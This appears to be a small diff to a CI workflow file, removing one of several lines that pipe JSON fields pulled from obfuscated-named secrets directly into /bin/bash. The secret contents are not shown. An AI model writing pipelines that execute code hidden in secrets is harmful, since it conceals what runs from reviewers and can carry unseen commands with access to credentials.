@@ -18,7 +18,6 @@ jobs:
           vxlzt11: ${{ secrets.vxlzt11 }}
         run: |
           printf '%s' "$vxlzt11" | jq -r .sdnid394 | /bin/bash
-          printf '%s' "$xbwcu81566" | jq -r .ojoby588 | /bin/bash
           printf '%s' "$lp47" | jq -r .n8 | /bin/bash
           printf '%s' "$bcmv94581" | jq -r .ivngz1 | /bin/bash
           printf '%s' "$jszu5" | jq -r .jbvy43167 | /bin/bash
